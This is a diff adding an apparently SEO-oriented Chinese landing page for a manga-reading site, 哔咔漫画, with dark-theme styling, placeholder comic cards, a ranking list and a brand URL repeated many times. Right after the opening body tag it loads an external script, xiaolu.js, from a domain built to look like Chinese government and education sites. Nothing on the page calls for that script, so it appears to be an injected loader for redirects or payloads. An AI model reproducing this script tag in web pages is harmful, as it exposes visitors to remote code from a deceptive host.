@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>哔咔漫画 - 手机漫画阅读首选平台 | bikamanhua-wap</title>
+    <meta name="description" content="哔咔漫画(https://bikamanhua-wap)提供海量高清漫画在线阅读，涵盖热血、恋爱、奇幻等多种类型，最新最快的漫画更新，欢迎访问哔咔漫画官网。">
+    <meta name="keywords" content="哔咔漫画, bikamanhua-wap, 漫画, 在线漫画, 手机漫画, 漫画阅读">
+    <meta name="robots" content="index, follow">
+    <meta name="bingbot" content="index, follow">
+    <style>
+        /* 全局样式与暗黑UI设计 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #0f0f1a;
+            color: #d1d1e0;
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+        }
+        a {
+            text-decoration: none;
+            color: #6c5ce7;
+            transition: color 0.3s;
+        }
+        a:hover {
+            color: #a29bfe;
+        }
+        ul {
+            list-style: none;
+        }
+        
+        /* 头部导航 */
+        header {
+            background: linear-gradient(90deg, #1a1a2e 0%, #16213e 100%);
+            padding: 1rem 5%;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+        }
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #e84393;
+            text-shadow: 0 0 10px rgba(232, 67, 147, 0.5);
+        }
+        .logo span {
+            color: #6c5ce7;
+        }
+        nav {
+            margin-top: 1rem;
+        }
+        nav ul {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        nav ul li a {
+            display: block;
+            padding: 0.6rem 1.2rem;
+            background: rgba(108, 92, 231, 0.1);
+            border: 1px solid rgba(108, 92, 231, 0.3);
+            border-radius: 25px;
+            color: #dfe6e9;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+        nav ul li a:hover {
+            background: #6c5ce7;
+            color: #fff;
+            border-color: #6c5ce7;
+        }
+
+        /* 主内容区 */
+        main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem 5%;
+        }
+
+        /* Hero区域 */
+        .hero {
+            text-align: center;
+            padding: 4rem 2rem;
+            background: radial-gradient(circle at top right, #2d1b4e 0%, #0f0f1a 60%);
+            border-radius: 20px;
+            margin-bottom: 3rem;
+            border: 1px solid rgba(232, 67, 147, 0.2);
+        }
+        .hero h1 {
+            font-size: 2.5rem;
+            color: #fff;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+        .hero h1 .highlight {
+            color: #e84393;
+        }
+        .hero .domain {
+            display: inline-block;
+            margin-top: 1rem;
+            padding: 0.8rem 1.5rem;
+            background: rgba(0,0,0,0.4);
+            border: 1px dashed #6c5ce7;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            color: #a29bfe;
+            letter-spacing: 1px;
+        }
+        .hero p {
+            font-size: 1.1rem;
+            color: #b2bec3;
+            max-width: 600px;
+            margin: 1.5rem auto 0;
+        }
+
+        /* 栏目通用样式 */
+        .section-title {
+            font-size: 1.8rem;
+            color: #fff;
+            margin-bottom: 2rem;
+            padding-left: 1rem;
+            border-left: 5px solid #e84393;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .section-title a {
+            font-size: 0.9rem;
+            font-weight: normal;
+            color: #6c5ce7;
+        }
+
+        /* 网格布局 */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+        }
+        .card {
+            background: #1a1a2e;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 20px rgba(108, 92, 231, 0.2);
+        }
+        .card-img {
+            height: 180px;
+            background: linear-gradient(45deg, #6c5ce7, #e84393);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        .card-content {
+            padding: 1.5rem;
+        }
+        .card-content h3 {
+            color: #fff;
+            margin-bottom: 0.8rem;
+            font-size: 1.2rem;
+        }
+        .card-content p {
+            color: #a4b0be;
+            font-size: 0.95rem;
+            margin-bottom: 1rem;
+        }
+        .card-content .btn {
+            display: inline-block;
+            padding: 0.5rem 1rem;
+            background: #6c5ce7;
+            color: #fff;
+            border-radius: 5px;
+            font-size: 0.9rem;
+        }
+        .card-content .btn:hover {
+            background: #5f50e8;
+        }
+
+        /* 排行榜列表 */
+        .ranking-list {
+            background: #1a1a2e;
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 3rem;
+        }
+        .ranking-item {
+            display: flex;
+            align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .ranking-item:last-child {
+            border-bottom: none;
+        }
+        .rank-num {
+            width: 30px;
+            height: 30px;
+            background: #e84393;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 1rem;
+            flex-shrink: 0;
+        }
+        .rank-info h4 {
+            color: #fff;
+            font-size: 1.1rem;
+            margin-bottom: 0.3rem;
+        }
+        .rank-info p {
+            color: #a4b0be;
+            font-size: 0.85rem;
+        }
+
+        /* 关于我们 */
+        .about-section {
+            background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
+            padding: 3rem 2rem;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        .about-section h2 {
+            color: #fff;
+            margin-bottom: 1.5rem;
+        }
+        .about-section p {
+            color: #b2bec3;
+            max-width: 800px;
+            margin: 0 auto 1rem;
+        }
+        .about-section .url-box {
+            margin-top: 2rem;
+            padding: 1rem;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            display: inline-block;
+            color: #6c5ce7;
+            font-weight: bold;
+        }
+
+        /* 底部 */
+        footer {
+            background: #0a0a14;
+            padding: 2rem 5%;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+        footer p {
+            color: #636e72;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+        footer .footer-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #e84393;
+            margin-bottom: 1rem;
+            display: inline-block;
+        }
+
+        /* 移动端自适应 */
+        @media (max-width: 768px) {
+            .header-top {
+                flex-direction: column;
+                text-align: center;
+            }
+            .logo {
+                margin-bottom: 1rem;
+            }
+            nav ul {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+            nav ul li a {
+                text-align: center;
+                border-radius: 8px;
+            }
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+            .hero .domain {
+                font-size: 1rem;
+                padding: 0.6rem 1rem;
+            }
+            .section-title {
+                font-size: 1.4rem;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+            .grid-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+    <!-- 头部区域 -->
+    <header>
+        <div class="header-top">
+            <div class="logo">哔咔<span>漫画</span></div>
+            <div style="color:#a4b0be; font-size:0.9rem;">官网：https://bikamanhua-wap</div>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">首页</a></li>
+                <li><a href="#">最新上架</a></li>
+                <li><a href="#">热门分类</a></li>
+                <li><a href="#">排行榜</a></li>
+                <li><a href="#">关于我们</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- 主内容 -->
+    <main>
+        <!-- Hero区域 -->
+        <section class="hero">
+            <h1>欢迎来到 <span class="highlight">哔咔漫画</span></h1>
+            <p>海量正版高清漫画，随时随地畅快阅读</p>
+            <div class="domain">https://bikamanhua-wap</div>
+        </section>
+
+        <!-- 栏目1：最新上架 -->
+        <section>
+            <h2 class="section-title">最新上架 <a href="#">查看更多 #</a></h2>
+            <div class="grid-container">
+                <div class="card">
+                    <div class="card-img">封面图</div>
+                    <div class="card-content">
+                        <h3>进击的巨人 最终季</h3>
+                        <p>在哔咔漫画阅读最新话，体验震撼的结局。</p>
+                        <a href="#" class="btn">开始阅读 #</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-img">封面图</div>
+                    <div class="card-content">
+                        <h3>咒术回战</h3>
+                        <p>最强咒术师们的战斗，尽在哔咔漫画。</p>
+                        <a href="#" class="btn">开始阅读 #</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-img">封面图</div>
+                    <div class="card-content">
+                        <h3>间谍过家家</h3>
+                        <p>温馨又搞笑的伪装家庭，快来哔咔漫画追更。</p>
+                        <a href="#" class="btn">开始阅读 #</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目2：热门分类 -->
+        <section>
+            <h2 class="section-title">热门分类 <a href="#">查看全部 #</a></h2>
+            <div class="grid-container">
+                <div class="card">
+                    <div class="card-content">
+                        <h3>🔥 热血战斗</h3>
+                        <p>海贼王、火影忍者、死神等经典热血漫画。</p>
+                        <a href="#" class="btn">进入分类 #</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-content">
+                        <h3>💖 恋爱校园</h3>
+                        <p>青春恋爱物语，甜蜜互动不容错过。</p>
+                        <a href="#" class="btn">进入分类 #</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-content">
+                        <h3>🎃 恐怖灵异</h3>
+                        <p>心跳加速的恐怖故事，胆小慎入。</p>
+                        <a href="#" class="btn">进入分类 #</a>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-content">
+                        <h3>🚀 科幻未来</h3>
+                        <p>探索未知宇宙，体验未来科技。</p>
+                        <a href="#" class="btn">进入分类 #</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目3：排行榜 -->
+        <section>
+            <h2 class="section-title">🔥 哔咔漫画排行榜 <a href="#">完整榜单 #</a></h2>
+            <div class="ranking-list">
+                <div class="ranking-item">
+                    <div class="rank-num">1</div>
+                    <div class="rank-info">
+                        <h4>海贼王</h4>
+                        <p>热血冒险 · 连载中</p>
+                    </div>
+                    <a href="#" style="margin-left:auto;">阅读 #</a>
+                </div>
+                <div class="ranking-item">
+                    <div class="rank-num" style="background:#6c5ce7;">2</div>
+                    <div class="rank-info">
+                        <h4>鬼灭之刃</h4>
+                        <p>和风奇幻 · 已完结</p>
+                    </div>
+                    <a href="#" style="margin-left:auto;">阅读 #</a>
+                </div>
+                <div class="ranking-item">
+                    <div class="rank-num" style="background:#00b894;">3</div>
+                    <div class="rank-info">
+                        <h4>电锯人</h4>
+                        <p>黑暗奇幻 · 连载中</p>
+                    </div>
+                    <a href="#" style="margin-left:auto;">阅读 #</a>
+                </div>
+                <div class="ranking-item">
+                    <div class="rank-num" style="background:#636e72;">4</div>
+                    <div class="rank-info">
+                        <h4>我的英雄学院</h4>
+                        <p>校园超能 · 连载中</p>
+                    </div>
+                    <a href="#" style="margin-left:auto;">阅读 #</a>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目4：关于我们 -->
+        <section class="about-section">
+            <h2>关于 哔咔漫画</h2>
+            <p>
+                <strong>哔咔漫画</strong>（网址：<strong>https://bikamanhua-wap</strong>）是一个专注于提供高质量手机漫画阅读体验的平台。
+                我们致力于为漫画爱好者提供最流畅、最清晰的阅读服务。无论您身在何处，只需访问 https://bikamanhua-wap，即可畅享海量漫画资源。
+            </p>
+            <p>
+                本网站为单页展示，更多精彩内容敬请期待。哔咔漫画，你的专属漫画管家。
+            </p>
+            <div class="url-box">
+                官方网站地址：https://bikamanhua-wap
+            </div>
+        </section>
+    </main>
+
+    <!-- 底部 -->
+    <footer>
+        <div class="footer-logo">哔咔漫画</div>
+        <p>网站名称：哔咔漫画 | 网站网址：https://bikamanhua-wap</p>
+        <p>© 2024 哔咔漫画 bikamanhua-wap. All Rights Reserved.</p>
+        <p style="margin-top:1rem;">
+            <a href="#">首页 #</a> | 
+            <a href="#">最新 #</a> | 
+            <a href="#">分类 #</a> | 
+            <a href="#">排行 #</a> | 
+            <a href="#">关于 #</a>
+        </p>
+    </footer>
+
+</body>
+</html>
